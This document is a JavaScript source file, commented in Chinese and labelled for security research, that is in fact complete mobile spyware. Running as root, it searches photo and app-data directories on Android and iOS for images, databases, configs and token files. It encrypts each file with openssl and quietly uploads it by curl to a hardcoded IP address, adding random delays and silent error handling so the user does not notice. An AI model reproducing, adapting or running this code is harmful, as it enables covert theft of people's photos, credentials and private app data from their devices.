// 安全研究专用 —— root 隐身扫描文件（JSCore 兼容版）
// 适配提权后的 JSCore 无浏览器 API 环境
const server_url = "http://43.156.104.233";

// ==============================================
// 安全研究专用 · root 精准静默窃取（图片+数据库+账号配置）
// 无弹窗、无日志、不写盘、用户无感知
// ==============================================

// 白名单后缀（只抓这些）
const ALLOW_EXTS = new Set([
  // 图片
  'jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'heic', 'heif', 'tiff',
  // 数据库
  'db', 'db3', 'sqlite', 'sqlite3', 'sql', 'wal', 'journal',
  // 账号配置/缓存/日志
  'xml', 'json', 'ini', 'conf', 'config', 'txt', 'log',
  'plist', 'dat', 'bak', 'vault', 'token'
]);

// 只扫描敏感目录，不扫全盘
const SCAN_PATHS = [
  '/sdcard/DCIM',
  '/sdcard/Pictures',
  '/data/data',
  '/var/mobile/Media/DCIM',
  '/var/mobile/Containers/Data'
];

// 最大深度，避免无限递归
const MAX_DEPTH = 4;

// ==============================================
// JSCore 环境 Polyfills（无 fetch/crypto.subtle/btoa/setTimeout）
// ==============================================

if (typeof btoa === 'undefined') {
    const BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    btoa = function(str) {
        let out = "";
        for (let i = 0; i < str.length; i += 3) {
            const a = str.charCodeAt(i);
            const b = i + 1 < str.length ? str.charCodeAt(i + 1) : 0;
            const c = i + 2 < str.length ? str.charCodeAt(i + 2) : 0;
            const bitmap = (a << 16) | (b << 8) | c;
            out += BASE64_CHARS.charAt((bitmap >> 18) & 63);
            out += BASE64_CHARS.charAt((bitmap >> 12) & 63);
            out += i + 1 < str.length ? BASE64_CHARS.charAt((bitmap >> 6) & 63) : '=';
            out += i + 2 < str.length ? BASE64_CHARS.charAt(bitmap & 63) : '=';
        }
        return out;
    };
}

if (typeof encodeURIComponent === 'undefined') {
    encodeURIComponent = function(str) {
        return str.replace(/[^A-Za-z0-9_.!~*'()-]/g, function(c) {
            return '%' + c.charCodeAt(0).toString(16).toUpperCase();
        });
    };
}

if (typeof unescape === 'undefined') {
    unescape = function(str) {
        return str.replace(/%([0-9A-Fa-f]{2})/g, function(_, hex) {
            return String.fromCharCode(parseInt(hex, 16));
        });
    };
}

if (typeof JSON === 'undefined') {
    JSON = {
        stringify: function(obj) {
            if (typeof obj === 'string') return '"' + obj.replace(/"/g, '\\"') + '"';
            if (typeof obj === 'number') return String(obj);
            if (Array.isArray(obj)) return '[' + obj.map(JSON.stringify).join(',') + ']';
            const pairs = [];
            for (let k in obj) {
                pairs.push('"' + k + '":' + JSON.stringify(obj[k]));
            }
            return '{' + pairs.join(',') + '}';
        }
    };
}

function escapeShell(str) {
    // 将单引号转义为 '"'"' 以适应单引号包裹的 shell 字符串
    return str.replace(/'/g, "'\"'\"'");
}

function sleep(ms) {
    // JSCore 环境同步睡眠（无 setTimeout）
    if (typeof __native_root_exec !== 'undefined') {
        __native_root_exec('sleep ' + (ms / 1000));
    } else {
        const start = Date.now();
        while (Date.now() - start < ms) {}
    }
}

function rand(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ==============================================
// 主入口（同步版，适配无事件循环的 JSCore）
// ==============================================

function stealthPreciseScan() {
    for (let i = 0; i < SCAN_PATHS.length; i++) {
        scanDir(SCAN_PATHS[i], 0);
    }
}

function scanDir(dir, depth) {
    if (depth > MAX_DEPTH) return;
    try {
        const raw = rootExec('find "' + escapeShell(dir) + '" -maxdepth 1 -type f 2>/dev/null');
        const files = raw.split('\n').filter(Boolean);
        for (let i = 0; i < files.length; i++) {
            const file = files[i];
            const parts = file.split('.');
            const ext = parts[parts.length - 1].toLowerCase();
            if (!ext || !ALLOW_EXTS.has(ext)) continue;
            sleep(rand(10, 50));
            const content = rootExec('cat "' + escapeShell(file) + '" 2>/dev/null');
            if (!content || content.length < 10) continue;
            uploadEncrypted(file, content);
        }
        const dirsRaw = rootExec('find "' + escapeShell(dir) + '" -maxdepth 1 -type d 2>/dev/null');
        const dirs = dirsRaw.split('\n').filter(Boolean);
        for (let i = 0; i < dirs.length; i++) {
            const d = dirs[i];
            if (d === dir) continue;
            scanDir(d, depth + 1);
        }
    } catch (e) {
        // 静默失败，不打印
    }
}

// ==============================================
// root 命令执行（同步）
// ==============================================

function rootExec(cmd) {
    if (typeof __native_root_exec !== 'undefined') {
        const result = __native_root_exec(cmd);
        return result || "";
    }
    return "";
}

// ==============================================
// 加密上传（同步，使用 curl + openssl）
// ==============================================

function uploadEncrypted(filePath, content) {
    try {
        if (!content || content.length < 10) return;
        const safePath = btoa(unescape(encodeURIComponent(filePath)));
        const encryptedData = aesEncryptReal(content, "aes_key_16bytes_01");
        const chunkSize = 4096;
        for (let i = 0; i < encryptedData.length; i += chunkSize) {
            const chunk = encryptedData.slice(i, i + chunkSize);
            silentFetch(server_url + "/api/upload", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    path: safePath,
                    chunk: chunk,
                    offset: i,
                    total: encryptedData.length
                })
            });
            sleep(Math.floor(Math.random() * 30 + 10));
        }
    } catch (e) {
        // 静默失败，不打印日志、不抛异常
    }
}

// ==============================================
// AES-128-CBC 加密（使用 openssl，适配 JSCore）
// 服务端预期格式：base64(IV(16字节) + ciphertext)
// ==============================================

function aesEncryptReal(data, keyStr) {
    const tmpBase = '/tmp/.scan_' + Math.floor(Math.random() * 10000000);
    const tmpKey  = tmpBase + '_key';
    const tmpIn   = tmpBase + '_in';
    const tmpOut  = tmpBase + '_out';
    const tmpIv   = tmpBase + '_iv';

    try {
        // 1. 将密钥写入临时文件并获取 hex
        rootExec('printf \'%s\' \'' + escapeShell(keyStr) + '\' > ' + tmpKey);
        const keyHex = rootExec('xxd -p ' + tmpKey + ' | tr -d "\\n"');

        // 2. 生成随机 IV
        const ivHex = rootExec('openssl rand -hex 16 | tr -d "\\n"');

        // 3. 将待加密数据写入临时文件
        rootExec('printf \'%s\' \'' + escapeShell(data) + '\' > ' + tmpIn);

        // 4. openssl AES-128-CBC 加密
        rootExec('openssl enc -aes-128-cbc -in ' + tmpIn + ' -out ' + tmpOut +
                 ' -K ' + keyHex + ' -iv ' + ivHex + ' 2>/dev/null');

        // 5. 将 IV 二进制与密文拼接后 base64
        rootExec('printf \'%s\' \'' + ivHex + '\' | xxd -r -p > ' + tmpIv);
        const result = rootExec('cat ' + tmpIv + ' ' + tmpOut + ' | base64 | tr -d "\\n"');

        return result;
    } finally {
        // 6. 清理临时文件
        rootExec('rm -f ' + tmpKey + ' ' + tmpIn + ' ' + tmpOut + ' ' + tmpIv);
    }
}

// ==============================================
// 静默 HTTP 请求（使用 curl，适配 JSCore）
// ==============================================

function silentFetch(url, opt) {
    try {
        const body = opt.body || '';
        const contentType = (opt.headers && opt.headers['Content-Type']) || 'application/json';
        const tmpBody = '/tmp/.scan_body_' + Math.floor(Math.random() * 10000000);
        rootExec('printf \'%s\' \'' + escapeShell(body) + '\' > ' + tmpBody);
        const cmd = 'curl -s -X ' + (opt.method || 'GET') +
                    ' -H "Content-Type: ' + contentType + '"' +
                    ' -d @' + tmpBody +
                    ' -m 5 ' + url +
                    ' >/dev/null 2>&1';
        rootExec(cmd);
        rootExec('rm -f ' + tmpBody);
    } catch (_) {}
}
